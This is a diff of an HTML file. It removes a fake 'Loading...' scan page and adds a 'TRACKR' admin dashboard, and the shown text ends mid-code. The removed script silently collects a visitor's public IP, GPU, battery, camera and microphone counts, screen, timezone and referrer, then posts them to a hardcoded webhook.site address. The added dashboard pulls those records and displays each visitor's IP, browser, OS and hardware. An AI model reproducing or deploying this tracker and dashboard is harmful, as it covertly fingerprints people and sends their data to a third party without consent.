@@ -3,18 +3,23 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Loading...</title>
-<link href="https://fonts.googleapis.com/css2?family=Space+Mono:ital,wght@0,400;0,700;1,400&family=Syne:wght@400;700;800&display=swap" rel="stylesheet">
+<title>ADMIN — DASHBOARD</title>
+<link href="https://fonts.googleapis.com/css2?family=Space+Mono:ital,wght@0,400;0,700;1,400&family=Syne:wght@400;600;700;800&display=swap" rel="stylesheet">
 <style>
   :root {
-    --bg: #060608;
-    --surface: #0d0d12;
-    --border: #1a1a2e;
+    --bg: #05050a;
+    --surface: #0a0a12;
+    --card: #0e0e18;
+    --border: #161625;
+    --border2: #1f1f35;
     --accent: #00ff9d;
+    --accent-dim: rgba(0,255,157,0.08);
     --accent2: #ff2d55;
     --accent3: #a855f7;
-    --text: #e8e8f0;
+    --accent4: #0ea5e9;
+    --text: #e8e8f2;
     --muted: #4a4a6a;
+    --muted2: #2a2a45;
     --mono: 'Space Mono', monospace;
     --sans: 'Syne', sans-serif;
   }
@@ -26,454 +31,803 @@
     color: var(--text);
     font-family: var(--mono);
     min-height: 100vh;
-    display: flex;
-    align-items: center;
-    justify-content: center;
-    overflow: hidden;
-    position: relative;
   }
 
-  /* Animated grid background */
+  /* Grid BG */
   body::before {
     content: '';
     position: fixed;
     inset: 0;
     background-image:
-      linear-gradient(rgba(0,255,157,0.03) 1px, transparent 1px),
-      linear-gradient(90deg, rgba(0,255,157,0.03) 1px, transparent 1px);
-    background-size: 40px 40px;
-    animation: gridMove 20s linear infinite;
+      linear-gradient(rgba(0,255,157,0.025) 1px, transparent 1px),
+      linear-gradient(90deg, rgba(0,255,157,0.025) 1px, transparent 1px);
+    background-size: 32px 32px;
     pointer-events: none;
+    z-index: 0;
   }
 
-  @keyframes gridMove {
-    0% { transform: translateY(0); }
-    100% { transform: translateY(40px); }
-  }
-
-  /* Radial glow */
-  body::after {
-    content: '';
-    position: fixed;
-    top: 50%;
-    left: 50%;
-    transform: translate(-50%, -50%);
-    width: 600px;
-    height: 600px;
-    background: radial-gradient(ellipse, rgba(0,255,157,0.04) 0%, transparent 70%);
-    pointer-events: none;
-  }
-
-  .container {
-    position: relative;
-    z-index: 10;
-    text-align: center;
-    padding: 40px;
-  }
-
-  .status-ring {
-    width: 120px;
-    height: 120px;
-    margin: 0 auto 32px;
-    position: relative;
-  }
-
-  .ring-svg {
-    width: 120px;
-    height: 120px;
-    animation: rotateSlow 4s linear infinite;
-  }
-
-  @keyframes rotateSlow {
-    from { transform: rotate(0deg); }
-    to { transform: rotate(360deg); }
-  }
-
-  .ring-inner {
-    position: absolute;
-    inset: 20px;
-    border-radius: 50%;
-    background: var(--surface);
-    border: 1px solid var(--border);
+  /* HEADER */
+  header {
+    position: sticky;
+    top: 0;
+    z-index: 100;
+    background: rgba(5,5,10,0.92);
+    backdrop-filter: blur(16px);
+    border-bottom: 1px solid var(--border);
+    padding: 0 32px;
+    height: 56px;
     display: flex;
     align-items: center;
-    justify-content: center;
-    font-size: 28px;
+    justify-content: space-between;
   }
 
-  .label {
-    font-family: var(--sans);
-    font-size: 11px;
-    font-weight: 700;
-    letter-spacing: 0.3em;
-    text-transform: uppercase;
-    color: var(--muted);
-    margin-bottom: 8px;
+  .header-left {
+    display: flex;
+    align-items: center;
+    gap: 16px;
   }
 
-  .title {
+  .logo {
     font-family: var(--sans);
-    font-size: 28px;
+    font-size: 15px;
     font-weight: 800;
+    letter-spacing: 0.05em;
     color: var(--text);
-    margin-bottom: 4px;
   }
 
-  .subtitle {
-    font-size: 11px;
+  .logo span { color: var(--accent); }
+
+  .header-badge {
+    font-size: 9px;
+    letter-spacing: 0.2em;
+    color: var(--muted);
+    border: 1px solid var(--border2);
+    padding: 2px 8px;
+    border-radius: 2px;
+    text-transform: uppercase;
+  }
+
+  .header-right {
+    display: flex;
+    align-items: center;
+    gap: 16px;
+  }
+
+  .live-dot {
+    display: flex;
+    align-items: center;
+    gap: 6px;
+    font-size: 10px;
     color: var(--muted);
     letter-spacing: 0.1em;
-    margin-bottom: 40px;
   }
 
-  .progress-bar {
-    width: 280px;
-    height: 2px;
-    background: var(--border);
-    margin: 0 auto 12px;
+  .dot {
+    width: 6px;
+    height: 6px;
+    border-radius: 50%;
+    background: var(--accent);
+    animation: pulse 2s ease-in-out infinite;
+  }
+
+  @keyframes pulse {
+    0%, 100% { opacity: 1; box-shadow: 0 0 0 0 rgba(0,255,157,0.4); }
+    50% { opacity: 0.7; box-shadow: 0 0 0 4px rgba(0,255,157,0); }
+  }
+
+  .btn {
+    font-family: var(--mono);
+    font-size: 10px;
+    letter-spacing: 0.15em;
+    text-transform: uppercase;
+    padding: 6px 14px;
+    border: 1px solid var(--border2);
+    background: transparent;
+    color: var(--muted);
+    cursor: pointer;
+    transition: all 0.2s;
+    border-radius: 2px;
+  }
+
+  .btn:hover { border-color: var(--accent); color: var(--accent); }
+  .btn.primary { border-color: var(--accent); color: var(--accent); background: var(--accent-dim); }
+
+  /* MAIN LAYOUT */
+  main {
+    position: relative;
+    z-index: 1;
+    padding: 32px;
+    max-width: 1400px;
+    margin: 0 auto;
+  }
+
+  /* STATS ROW */
+  .stats-row {
+    display: grid;
+    grid-template-columns: repeat(4, 1fr);
+    gap: 12px;
+    margin-bottom: 24px;
+  }
+
+  .stat-card {
+    background: var(--card);
+    border: 1px solid var(--border);
+    padding: 16px 20px;
+    border-radius: 4px;
     position: relative;
     overflow: hidden;
   }
 
-  .progress-fill {
-    height: 100%;
-    background: var(--accent);
-    width: 0%;
-    transition: width 0.3s ease;
-    box-shadow: 0 0 10px var(--accent);
+  .stat-card::before {
+    content: '';
+    position: absolute;
+    top: 0; left: 0; right: 0;
+    height: 1px;
+    background: linear-gradient(90deg, transparent, var(--accent-color, var(--accent)), transparent);
+    opacity: 0.5;
   }
 
-  .progress-label {
-    font-size: 10px;
+  .stat-card.c1 { --accent-color: var(--accent); }
+  .stat-card.c2 { --accent-color: var(--accent2); }
+  .stat-card.c3 { --accent-color: var(--accent3); }
+  .stat-card.c4 { --accent-color: var(--accent4); }
+
+  .stat-label {
+    font-size: 9px;
+    letter-spacing: 0.2em;
     color: var(--muted);
-    letter-spacing: 0.15em;
+    text-transform: uppercase;
+    margin-bottom: 8px;
   }
 
-  .log {
-    margin-top: 32px;
-    width: 320px;
-    text-align: left;
-  }
-
-  .log-line {
-    font-size: 10px;
-    color: var(--muted);
-    padding: 3px 0;
-    opacity: 0;
-    transform: translateX(-10px);
-    transition: all 0.3s ease;
-    display: flex;
-    gap: 8px;
-  }
-
-  .log-line.visible {
-    opacity: 1;
-    transform: translateX(0);
-  }
-
-  .log-line .log-prefix { color: var(--accent); flex-shrink: 0; }
-  .log-line .log-text { color: var(--muted); }
-  .log-line.ok .log-prefix { color: var(--accent); }
-  .log-line.err .log-prefix { color: var(--accent2); }
-
-  /* Success state */
-  .success-screen {
-    display: none;
-    flex-direction: column;
-    align-items: center;
-    gap: 8px;
-  }
-
-  .success-screen.show { display: flex; }
-
-  .success-icon {
-    font-size: 48px;
-    animation: popIn 0.5s cubic-bezier(0.175, 0.885, 0.32, 1.275);
-  }
-
-  @keyframes popIn {
-    0% { transform: scale(0); opacity: 0; }
-    100% { transform: scale(1); opacity: 1; }
-  }
-
-  .success-title {
+  .stat-value {
     font-family: var(--sans);
-    font-size: 20px;
+    font-size: 28px;
     font-weight: 800;
+    color: var(--text);
+    line-height: 1;
+  }
+
+  .stat-sub {
+    font-size: 9px;
+    color: var(--muted);
+    margin-top: 4px;
+  }
+
+  /* CONTENT GRID */
+  .content-grid {
+    display: grid;
+    grid-template-columns: 1fr 340px;
+    gap: 16px;
+  }
+
+  /* ENTRIES PANEL */
+  .panel {
+    background: var(--card);
+    border: 1px solid var(--border);
+    border-radius: 4px;
+    overflow: hidden;
+  }
+
+  .panel-header {
+    padding: 14px 20px;
+    border-bottom: 1px solid var(--border);
+    display: flex;
+    align-items: center;
+    justify-content: space-between;
+  }
+
+  .panel-title {
+    font-family: var(--sans);
+    font-size: 12px;
+    font-weight: 700;
+    letter-spacing: 0.1em;
+    text-transform: uppercase;
+    color: var(--text);
+  }
+
+  .panel-count {
+    font-size: 10px;
+    color: var(--muted);
+  }
+
+  /* ENTRY CARDS */
+  .entries-list {
+    padding: 12px;
+    display: flex;
+    flex-direction: column;
+    gap: 8px;
+    max-height: 70vh;
+    overflow-y: auto;
+    scrollbar-width: thin;
+    scrollbar-color: var(--border2) transparent;
+  }
+
+  .entry-card {
+    background: var(--surface);
+    border: 1px solid var(--border);
+    border-radius: 3px;
+    padding: 14px;
+    cursor: pointer;
+    transition: border-color 0.2s, background 0.2s;
+    position: relative;
+  }
+
+  .entry-card:hover { border-color: var(--border2); background: var(--card); }
+  .entry-card.active { border-color: var(--accent); background: var(--accent-dim); }
+
+  .entry-card::before {
+    content: '';
+    position: absolute;
+    left: 0; top: 0; bottom: 0;
+    width: 2px;
+    background: var(--accent);
+    opacity: 0;
+    transition: opacity 0.2s;
+  }
+  .entry-card.active::before { opacity: 1; }
+
+  .entry-top {
+    display: flex;
+    justify-content: space-between;
+    align-items: flex-start;
+    margin-bottom: 10px;
+  }
+
+  .entry-num {
+    font-family: var(--sans);
+    font-size: 11px;
+    font-weight: 700;
     color: var(--accent);
   }
 
-  .success-sub {
-    font-size: 10px;
+  .entry-time {
+    font-size: 9px;
     color: var(--muted);
-    letter-spacing: 0.15em;
+    letter-spacing: 0.05em;
+  }
+
+  .entry-ip {
+    font-size: 13px;
+    font-weight: 700;
+    color: var(--text);
+    margin-bottom: 6px;
+    font-family: var(--sans);
+  }
+
+  .entry-chips {
+    display: flex;
+    flex-wrap: wrap;
+    gap: 4px;
+  }
+
+  .chip {
+    font-size: 8px;
+    letter-spacing: 0.1em;
+    padding: 2px 6px;
+    border: 1px solid var(--border2);
+    border-radius: 2px;
+    color: var(--muted);
+    text-transform: uppercase;
+    white-space: nowrap;
+  }
+
+  /* DETAIL PANEL */
+  .detail-panel {
+    display: flex;
+    flex-direction: column;
+    gap: 0;
+    max-height: calc(70vh + 56px);
+    overflow-y: auto;
+    scrollbar-width: thin;
+    scrollbar-color: var(--border2) transparent;
+  }
+
+  .detail-empty {
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    justify-content: center;
+    height: 200px;
+    color: var(--muted);
+    font-size: 11px;
+    gap: 8px;
+    text-align: center;
+    letter-spacing: 0.1em;
+  }
+
+  .detail-section {
+    border-bottom: 1px solid var(--border);
+  }
+
+  .detail-section-header {
+    padding: 10px 16px;
+    font-size: 9px;
+    letter-spacing: 0.2em;
+    text-transform: uppercase;
+    color: var(--muted);
+    display: flex;
+    align-items: center;
+    gap: 6px;
+    background: var(--surface);
+  }
+
+  .detail-rows { padding: 8px 16px; }
+
+  .detail-row {
+    display: flex;
+    justify-content: space-between;
+    align-items: baseline;
+    padding: 4px 0;
+    border-bottom: 1px solid var(--border);
+    gap: 8px;
+  }
+
+  .detail-row:last-child { border-bottom: none; }
+
+  .detail-key {
+    font-size: 9px;
+    color: var(--muted);
+    letter-spacing: 0.08em;
+    flex-shrink: 0;
     text-transform: uppercase;
   }
 
+  .detail-val {
+    font-size: 10px;
+    color: var(--text);
+    text-align: right;
+    word-break: break-all;
+  }
+
+  .detail-val.accent { color: var(--accent); }
+  .detail-val.accent2 { color: var(--accent2); }
+  .detail-val.accent3 { color: var(--accent3); }
+  .detail-val.accent4 { color: var(--accent4); }
+
+  /* EMPTY / LOADING */
+  #loadingState {
+    text-align: center;
+    padding: 60px 20px;
+    color: var(--muted);
+    font-size: 11px;
+    letter-spacing: 0.1em;
+  }
+
+  .spinner {
+    width: 24px;
+    height: 24px;
+    border: 1px solid var(--border2);
+    border-top-color: var(--accent);
+    border-radius: 50%;
+    animation: spin 1s linear infinite;
+    margin: 0 auto 12px;
+  }
+
+  @keyframes spin { to { transform: rotate(360deg); } }
+
+  /* WEBHOOK INPUT */
+  .config-bar {
+    display: flex;
+    gap: 8px;
+    margin-bottom: 24px;
+    align-items: center;
+  }
+
+  .config-label {
+    font-size: 9px;
+    color: var(--muted);
+    letter-spacing: 0.15em;
+    text-transform: uppercase;
+    white-space: nowrap;
+  }
+
+  .config-input {
+    flex: 1;
+    font-family: var(--mono);
+    font-size: 10px;
+    background: var(--card);
+    border: 1px solid var(--border2);
+    color: var(--text);
+    padding: 8px 12px;
+    border-radius: 2px;
+    outline: none;
+    transition: border-color 0.2s;
+  }
+
+  .config-input:focus { border-color: var(--accent); }
+
+  /* Scan line */
   .scan-line {
     position: fixed;
     left: 0; right: 0;
-    height: 2px;
-    background: linear-gradient(90deg, transparent, rgba(0,255,157,0.15), transparent);
-    animation: scan 6s linear infinite;
+    height: 1px;
+    background: linear-gradient(90deg, transparent, rgba(0,255,157,0.08), transparent);
+    animation: scan 8s linear infinite;
     pointer-events: none;
     z-index: 5;
   }
 
   @keyframes scan {
-    0% { top: -2px; }
+    0% { top: 0; }
     100% { top: 100vh; }
   }
 
-  .corner {
+  /* TOAST */
+  .toast {
     position: fixed;
-    width: 20px;
-    height: 20px;
-    border-color: var(--muted);
-    border-style: solid;
-    opacity: 0.3;
+    bottom: 24px;
+    right: 24px;
+    background: var(--card);
+    border: 1px solid var(--accent);
+    color: var(--accent);
+    font-size: 10px;
+    letter-spacing: 0.1em;
+    padding: 10px 16px;
+    border-radius: 3px;
+    transform: translateY(80px);
+    opacity: 0;
+    transition: all 0.3s ease;
+    z-index: 200;
   }
-  .corner.tl { top: 20px; left: 20px; border-width: 1px 0 0 1px; }
-  .corner.tr { top: 20px; right: 20px; border-width: 1px 1px 0 0; }
-  .corner.bl { bottom: 20px; left: 20px; border-width: 0 0 1px 1px; }
-  .corner.br { bottom: 20px; right: 20px; border-width: 0 1px 1px 0; }
+
+  .toast.show { transform: translateY(0); opacity: 1; }
+
+  @media (max-width: 900px) {
+    main { padding: 16px; }
+    .stats-row { grid-template-columns: repeat(2, 1fr); }
+    .content-grid { grid-template-columns: 1fr; }
+    header { padding: 0 16px; }
+  }
 </style>
 </head>
 <body>
 
 <div class="scan-line"></div>
-<div class="corner tl"></div>
-<div class="corner tr"></div>
-<div class="corner bl"></div>
-<div class="corner br"></div>
 
-<div class="container">
+<header>
+  <div class="header-left">
+    <div class="logo">TRACK<span>R</span></div>
+    <div class="header-badge">Admin Panel v1.0</div>
+  </div>
+  <div class="header-right">
+    <div class="live-dot"><div class="dot"></div><span id="liveStatus">EN DIRECT</span></div>
+    <button class="btn primary" onclick="loadWebhook()">↻ REFRESH</button>
+  </div>
+</header>
 
-  <!-- Loading state -->
-  <div id="loading">
-    <div class="status-ring">
-      <svg class="ring-svg" viewBox="0 0 120 120">
-        <circle cx="60" cy="60" r="54" fill="none" stroke="#1a1a2e" stroke-width="1"/>
-        <circle cx="60" cy="60" r="54" fill="none" stroke="#00ff9d" stroke-width="1"
-          stroke-dasharray="60 280" stroke-linecap="round" opacity="0.8"/>
-        <circle cx="60" cy="60" r="46" fill="none" stroke="#a855f7" stroke-width="0.5"
-          stroke-dasharray="20 270" stroke-dashoffset="100" opacity="0.5"/>
-      </svg>
-      <div class="ring-inner">📡</div>
-    </div>
+<main>
 
-    <div class="label">Système de reconnaissance</div>
-    <div class="title">SCAN EN COURS</div>
-    <div class="subtitle">collecte des données système</div>
-
-    <div class="progress-bar">
-      <div class="progress-fill" id="progressFill"></div>
-    </div>
-    <div class="progress-label" id="progressLabel">INITIALISATION...</div>
-
-    <div class="log" id="log"></div>
+  <!-- Config bar -->
+  <div class="config-bar">
+    <span class="config-label">URL WEBHOOK :</span>
+    <input class="config-input" id="webhookInput"
+      value="https://webhook.site/token/42e9b838-f4c0-4861-8ac7-77a02b29ac0a/requests"
+      placeholder="https://webhook.site/token/UUID/requests">
+    <button class="btn primary" onclick="loadWebhook()">CHARGER</button>
   </div>
 
-  <!-- Success state -->
-  <div class="success-screen" id="success">
-    <div class="success-icon">✓</div>
-    <div class="success-title">TRANSMISSION OK</div>
-    <div class="success-sub">données envoyées · <span id="successTime"></span></div>
+  <!-- Stats -->
+  <div class="stats-row">
+    <div class="stat-card c1">
+      <div class="stat-label">Total visites</div>
+      <div class="stat-value" id="statTotal">—</div>
+      <div class="stat-sub">requêtes reçues</div>
+    </div>
+    <div class="stat-card c2">
+      <div class="stat-label">Dernière visite</div>
+      <div class="stat-value" id="statLast" style="font-size:16px;padding-top:6px">—</div>
+      <div class="stat-sub" id="statLastSub">—</div>
+    </div>
+    <div class="stat-card c3">
+      <div class="stat-label">IPs uniques</div>
+      <div class="stat-value" id="statIPs">—</div>
+      <div class="stat-sub">adresses distinctes</div>
+    </div>
+    <div class="stat-card c4">
+      <div class="stat-label">Plateformes</div>
+      <div class="stat-value" id="statPlatforms">—</div>
+      <div class="stat-sub" id="statPlatformsSub">—</div>
+    </div>
   </div>
 
-</div>
+  <!-- Content -->
+  <div class="content-grid">
+
+    <!-- Entries list -->
+    <div class="panel">
+      <div class="panel-header">
+        <span class="panel-title">Entrées</span>
+        <span class="panel-count" id="entriesCount">—</span>
+      </div>
+      <div class="entries-list" id="entriesList">
+        <div id="loadingState">
+          <div class="spinner"></div>
+          <div>CHARGEMENT...</div>
+        </div>
+      </div>
+    </div>
+
+    <!-- Detail -->
+    <div class="panel">
+      <div class="panel-header">
+        <span class="panel-title">Détail</span>
+        <span class="panel-count" id="detailTitle">—</span>
+      </div>
+      <div class="detail-panel" id="detailPanel">
+        <div class="detail-empty">
+          <div style="font-size:24px">←</div>
+          <div>SÉLECTIONNER UNE ENTRÉE</div>
+        </div>
+      </div>
+    </div>
+
+  </div>
+</main>
+
+<div class="toast" id="toast"></div>
 
 <script>
-const WEBHOOK_URL = "https://webhook.site/42e9b838-f4c0-4861-8ac7-77a02b29ac0a";
+  let allEntries = [];
+  let selectedIdx = -1;
 
-const logEl = document.getElementById('log');
-const progressFill = document.getElementById('progressFill');
-const progressLabel = document.getElementById('progressLabel');
-
-function addLog(text, type = 'ok') {
-  const line = document.createElement('div');
-  line.className = `log-line ${type}`;
-  const prefix = type === 'ok' ? '▶' : '✗';
-  line.innerHTML = `<span class="log-prefix">${prefix}</span><span class="log-text">${text}</span>`;
-  logEl.appendChild(line);
-  requestAnimationFrame(() => line.classList.add('visible'));
-}
-
-function setProgress(pct, label) {
-  progressFill.style.width = pct + '%';
-  progressLabel.textContent = label;
-}
-
-async function getIP() {
-  try {
-    const r = await fetch('https://api.ipify.org?format=json');
-    const d = await r.json();
-    return d.ip;
-  } catch { return 'N/A'; }
-}
-
-function getGPU() {
-  try {
-    const canvas = document.createElement('canvas');
-    const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
-    if (!gl) return 'N/A';
-    const ext = gl.getExtension('WEBGL_debug_renderer_info');
-    if (!ext) return 'WebGL (info bloquée)';
-    return gl.getParameter(ext.UNMASKED_RENDERER_WEBGL);
-  } catch { return 'N/A'; }
-}
-
-function getBatteryData() {
-  return navigator.getBattery
-    ? navigator.getBattery().then(b => ({
-        level: Math.round(b.level * 100) + '%',
-        charging: b.charging ? 'Oui' : 'Non',
-      }))
-    : Promise.resolve({ level: 'N/A', charging: 'N/A' });
-}
-
-function getConnectionInfo() {
-  const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
-  if (!conn) return { type: 'N/A', effectiveType: 'N/A', downlink: 'N/A', rtt: 'N/A' };
-  return {
-    type: conn.type || 'N/A',
-    effectiveType: conn.effectiveType || 'N/A',
-    downlink: conn.downlink ? conn.downlink + ' Mbps' : 'N/A',
-    rtt: conn.rtt ? conn.rtt + ' ms' : 'N/A',
-  };
-}
-
-function getMediaDevices() {
-  return navigator.mediaDevices?.enumerateDevices
-    ? navigator.mediaDevices.enumerateDevices().then(devices => ({
-        cameras: devices.filter(d => d.kind === 'videoinput').length,
-        microphones: devices.filter(d => d.kind === 'audioinput').length,
-        speakers: devices.filter(d => d.kind === 'audiooutput').length,
-      }))
-    : Promise.resolve({ cameras: 'N/A', microphones: 'N/A', speakers: 'N/A' });
-}
-
-async function collect() {
-  setProgress(5, 'ANALYSE NAVIGATEUR...');
-  addLog('Navigateur détecté : ' + navigator.userAgent.split(')')[0].split('(')[1]);
-  await delay(300);
-
-  setProgress(15, 'LECTURE SYSTÈME...');
-  addLog('Plateforme : ' + navigator.platform);
-  addLog('Cœurs CPU : ' + navigator.hardwareConcurrency);
-  addLog('RAM estimée : ' + (navigator.deviceMemory ?? 'N/A') + ' Go');
-  await delay(300);
-
-  setProgress(30, 'ANALYSE ÉCRAN...');
-  addLog('Résolution : ' + screen.width + 'x' + screen.height);
-  addLog('Ratio pixel : ' + window.devicePixelRatio + 'x');
-  addLog('Profondeur couleur : ' + screen.colorDepth + ' bits');
-  await delay(300);
-
-  setProgress(45, 'DÉTECTION RÉSEAU...');
-  const ip = await getIP();
-  addLog('IP publique : ' + ip);
-  const conn = getConnectionInfo();
-  addLog('Connexion : ' + conn.effectiveType + ' — ' + conn.downlink);
-  await delay(300);
-
-  setProgress(58, 'LECTURE GPU...');
-  const gpu = getGPU();
-  addLog('GPU : ' + (gpu.length > 40 ? gpu.substring(0,40)+'…' : gpu));
-  await delay(300);
-
-  setProgress(70, 'BATTERIE & PÉRIPHÉRIQUES...');
-  const battery = await getBatteryData();
-  addLog('Batterie : ' + battery.level + ' | Charge : ' + battery.charging);
-  const media = await getMediaDevices();
-  addLog('Caméras: ' + media.cameras + ' | Micros: ' + media.microphones);
-  await delay(300);
-
-  setProgress(85, 'COLLECTE FINALE...');
-  const tz = Intl.DateTimeFormat().resolvedOptions().timeZone;
-  addLog('Fuseau : ' + tz);
-  addLog('Langue : ' + navigator.language + ' | En ligne : ' + (navigator.onLine ? 'Oui' : 'Non'));
-  await delay(300);
-
-  setProgress(95, 'ENVOI WEBHOOK...');
-
-  const payload = {
-    meta: {
-      timestamp: new Date().toISOString(),
-      date_lisible: new Date().toLocaleString('fr-FR'),
-      ip_publique: ip,
-      url_source: location.href,
-      referrer: document.referrer || 'direct',
-    },
-    navigateur: {
-      user_agent: navigator.userAgent,
-      plateforme: navigator.platform,
-      langue: navigator.language,
-      langues: navigator.languages?.join(', '),
-      cookies_actifs: navigator.cookieEnabled,
-      do_not_track: navigator.doNotTrack,
-      online: navigator.onLine,
-    },
-    materiel: {
-      cpu_coeurs: navigator.hardwareConcurrency,
-      ram_go: navigator.deviceMemory ?? 'N/A',
-      gpu: gpu,
-      ecran_resolution: screen.width + 'x' + screen.height,
-      ecran_disponible: screen.availWidth + 'x' + screen.availHeight,
-      ratio_pixel: window.devicePixelRatio,
-      profondeur_couleur: screen.colorDepth + ' bits',
-      fenetre: window.innerWidth + 'x' + window.innerHeight,
-      orientation: screen.orientation?.type ?? 'N/A',
-      ecran_tactile: navigator.maxTouchPoints > 0,
-      nb_points_touch: navigator.maxTouchPoints,
-    },
-    reseau: {
-      ip_publique: ip,
-      type: conn.type,
-      qualite: conn.effectiveType,
-      debit: conn.downlink,
-      latence: conn.rtt,
-    },
-    batterie: battery,
-    peripheriques: media,
-    temps: {
-      fuseau: tz,
-      offset_utc: -new Date().getTimezoneOffset() / 60 + 'h',
-      timestamp_unix: Date.now(),
-    },
-    performance: {
-      memoire_js: performance.memory
-        ? Math.round(performance.memory.usedJSHeapSize / 1048576) + ' MB'
-        : 'N/A',
-    },
-  };
-
-  try {
-    await fetch(WEBHOOK_URL, {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify(payload),
-    });
-    setProgress(100, 'TERMINÉ');
-    addLog('Transmission réussie ✓', 'ok');
-    await delay(600);
-    showSuccess();
-  } catch(e) {
-    setProgress(100, 'ERREUR');
-    addLog('Erreur envoi : ' + e.message, 'err');
+  function showToast(msg) {
+    const t = document.getElementById('toast');
+    t.textContent = msg;
+    t.classList.add('show');
+    setTimeout(() => t.classList.remove('show'), 2500);
   }
-}
 
-function showSuccess() {
-  document.getElementById('loading').style.display = 'none';
-  const s = document.getElementById('success');
-  s.classList.add('show');
-  document.getElementById('successTime').textContent = new Date().toLocaleTimeString('fr-FR');
-}
+  function parseEntry(req) {
+    try {
+      const body = typeof req.content === 'string'
+        ? JSON.parse(req.content)
+        : req.content;
+      return body;
+    } catch {
+      return null;
+    }
+  }
 
-function delay(ms) { return new Promise(r => setTimeout(r, ms)); }
+  function detectBrowser(ua = '') {
+    if (ua.includes('Firefox')) return 'Firefox';
+    if (ua.includes('Edg/')) return 'Edge';
+    if (ua.includes('OPR') || ua.includes('Opera')) return 'Opera';
+    if (ua.includes('Chrome')) return 'Chrome';
+    if (ua.includes('Safari')) return 'Safari';
+    return 'Inconnu';
+  }
 
-collect();
+  function detectOS(ua = '') {
+    if (ua.includes('Windows NT')) return 'Windows';
+    if (ua.includes('Mac OS X')) return 'macOS';
+    if (ua.includes('Android')) return 'Android';
+    if (ua.includes('iPhone') || ua.includes('iPad')) return 'iOS';
+    if (ua.includes('Linux')) return 'Linux';
+    return 'Inconnu';
+  }
+
+  function renderStats(entries) {
+    const parsed = entries.map(e => parseEntry(e)).filter(Boolean);
+
+    document.getElementById('statTotal').textContent = entries.length;
+
+    if (entries.length > 0) {
+      const last = entries[0];
+      const d = new Date(last.created_at || Date.now());
+      document.getElementById('statLast').textContent = d.toLocaleTimeString('fr-FR', {hour:'2-digit',minute:'2-digit'});
+      document.getElementById('statLastSub').textContent = d.toLocaleDateString('fr-FR');
+    }
+
+    const ips = new Set(parsed.map(p => p?.reseau?.ip_publique || p?.meta?.ip_publique).filter(Boolean));
+    document.getElementById('statIPs').textContent = ips.size || '—';
+
+    const oses = {};
+    parsed.forEach(p => {
+      const ua = p?.navigateur?.user_agent || '';
+      const os = detectOS(ua);
+      oses[os] = (oses[os] || 0) + 1;
+    });
+    const topOS = Object.entries(oses).sort((a,b) => b[1]-a[1])[0];
+    document.getElementById('statPlatforms').textContent = Object.keys(oses).length || '—';
+    document.getElementById('statPlatformsSub').textContent = topOS ? topOS[0] + ' (majorité)' : '—';
+  }
+
+  function renderList(entries) {
+    const list = document.getElementById('entriesList');
+    list.innerHTML = '';
+
+    if (entries.length === 0) {
+      list.innerHTML = '<div style="text-align:center;padding:40px;color:var(--muted);font-size:11px;letter-spacing:0.1em">AUCUNE ENTRÉE</div>';
+      document.getElementById('entriesCount').textContent = '0 requête(s)';
+      return;
+    }
+
+    document.getElementById('entriesCount').textContent = entries.length + ' requête(s)';
+
+    entries.forEach((req, i) => {
+      const body = parseEntry(req);
+      const ua = body?.navigateur?.user_agent || '';
+      const browser = detectBrowser(ua);
+      const os = detectOS(ua);
+      const ip = body?.reseau?.ip_publique || body?.meta?.ip_publique || req.ip || '?.?.?.?';
+      const ts = new Date(req.created_at || body?.meta?.timestamp || Date.now());
+      const screen = body?.materiel?.ecran_resolution || '—';
+      const lang = body?.navigateur?.langue || '—';
+
+      const card = document.createElement('div');
+      card.className = 'entry-card';
+      card.dataset.idx = i;
+      card.innerHTML = `
+        <div class="entry-top">
+          <span class="entry-num">#${String(entries.length - i).padStart(3,'0')}</span>
+          <span class="entry-time">${ts.toLocaleTimeString('fr-FR')} · ${ts.toLocaleDateString('fr-FR')}</span>
+        </div>
+        <div class="entry-ip">${ip}</div>
+        <div class="entry-chips">
+          <span class="chip">${browser}</span>
+          <span class="chip">${os}</span>
+          <span class="chip">${screen}</span>
+          <span class="chip">${lang}</span>
+        </div>
+      `;
+      card.addEventListener('click', () => selectEntry(i, card));
+      list.appendChild(card);
+    });
+  }
+
+  function selectEntry(i, card) {
+    document.querySelectorAll('.entry-card').forEach(c => c.classList.remove('active'));
+    card.classList.add('active');
+    selectedIdx = i;
+    renderDetail(allEntries[i]);
+  }
+
+  function renderDetail(req) {
+    const body = parseEntry(req);
+    const panel = document.getElementById('detailPanel');
+    document.getElementById('detailTitle').textContent = body?.meta?.ip_publique || req.ip || '—';
+
+    if (!body) {
+      panel.innerHTML = `<div class="detail-empty"><div>FORMAT INCONNU</div><div style="font-size:9px;margin-top:4px">Données brutes non parsables</div></div>`;
+      return;
+    }
+
+    const sections = [
+      {
+        icon: '📡', label: 'Meta',
+        rows: [
+          ['Timestamp', body.meta?.date_lisible || body.meta?.timestamp, 'accent'],
+          ['IP publique', body.meta?.ip_publique, 'accent'],
+          ['Source URL', body.meta?.url_source],
+          ['Referrer', body.meta?.referrer || 'direct'],
+        ]
+      },
+      {
+        icon: '🌐', label: 'Navigateur',
+        rows: [
+          ['Navigateur', detectBrowser(body.navigateur?.user_agent), 'accent4'],
+          ['OS', detectOS(body.navigateur?.user_agent), 'accent4'],
+          ['Langue', body.navigateur?.langue],
+          ['Langues', body.navigateur?.langues],
+          ['Do Not Track', body.navigateur?.do_not_track],
+          ['Cookies', body.navigateur?.cookies_actifs ? 'Actifs' : 'Désactivés'],
+          ['En ligne', body.navigateur?.online ? 'Oui' : 'Non'],
+        ]
+      },
+      {
+        icon: '💻', label: 'Matériel',
+        rows: [
+          ['CPU cœurs', body.materiel?.cpu_coeurs, 'accent3'],
+          ['RAM', body.materiel?.ram_go ? body.materiel.ram_go + ' Go' : 'N/A', 'accent3'],
+          ['GPU', body.materiel?.gpu],
+          ['Résolution', body.materiel?.ecran_resolution],
+          ['Dispo écran', body.materiel?.ecran_disponible],
+          ['Ratio pixel', body.materiel?.ratio_pixel + 'x'],
+          ['Couleur', body.materiel?.profondeur_couleur],
+          ['Fenêtre', body.materiel?.fenetre],
+          ['Orientation', body.materiel?.orientation],
+          ['Tactile', body.materiel?.ecran_tactile ? 'Oui (' + body.materiel?.nb_points_touch + ' pts)' : 'Non'],
+        ]
+      },
+      {
+        icon: '📶', label: 'Réseau',
+        rows: [
+          ['Type', body.reseau?.type],
